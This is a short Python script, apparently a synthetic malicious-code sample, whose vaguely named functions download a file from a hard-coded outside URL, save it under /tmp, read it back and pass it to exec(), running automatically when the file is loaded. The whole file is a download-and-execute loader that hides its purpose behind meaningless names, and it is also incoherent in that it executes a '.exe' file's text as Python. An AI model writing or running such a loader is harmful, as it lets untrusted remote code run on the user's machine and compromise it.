import requests
import os

def g1(url):
    response = requests.get(url)
    return response.text

def g2(filepath, code):
    with open(filepath, "w") as f:
        f.write(code)

def g3(filepath):
    with open(filepath, "r") as f:
        return f.read()

def g4(script):
    try:
        exec(script)
    except Exception as e:
        print(e)

def main_flow(url, filepath):
    c = g1(url)
    g2(filepath, c)

    s = g3(filepath)
    g4(s)

def main():
    random_url = "http://random-url-73.com/script.exe"
    local_file = "/tmp/script73.exe"

    main_flow(random_url, local_file)

main()
